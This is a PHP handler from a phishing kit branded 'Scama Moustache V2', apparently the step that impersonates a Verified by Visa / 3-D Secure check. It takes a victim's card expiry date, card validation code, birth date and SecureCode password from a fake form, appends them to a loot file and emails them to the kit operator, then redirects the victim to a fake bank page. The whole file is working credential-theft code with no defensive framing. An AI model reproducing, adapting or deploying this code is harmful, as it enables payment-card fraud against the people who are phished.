<?php

session_start();

include './email.php';

if(isset($_POST['password_vbv'])){
	if(!empty($_POST['password_vbv'])){

$dt_1 = $_POST['dt_1'];

$dt_2 = $_POST['dt_2'];

##################################

$cart_val = $_POST['cart_val'];

##################################

$b_date = $_POST['b_date'];

$m_date  = $_POST['m_date'];

$y_date = $_POST['y_date'];

##################################


$password_vbv = $_POST['password_vbv'];







$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$wiz = "New Scama Moustache V2 ";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = " VBV By Moustache Wiz V2 <3 <3 -  [ " .$ip. " - " .$wiz. " ] ";
$headers .= "From: MoustacheV2" . "\r\n";

$message = "


Card Expiration Date:       =>   ".$dt_1. '/' . $dt_2."
Card Validation Code:       =>   ".$cart_val."
Birth Date:                 =>   ".$b_date. '/' . $m_date . '/' . $y_date."
Password or SecureCode(3d)  =>   ".$password_vbv."
IP                          =>   "."http://www.geoiptool.com/?IP=".$ip."
TIME                        =>   <font color='#3366FF'>".$time."

";

$txt = fopen('../../rezlt.txt', 'a');
fwrite($txt, $message);
fclose($txt);

mail($yourmail, $subject, $message , $headers);

 header("location:../bank.php?websrc=".md5('X-moustache')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");

 }else{
	header("Location: ../lodvbv.php");
}}else{
	header("Location: ../lodvbv.php");
}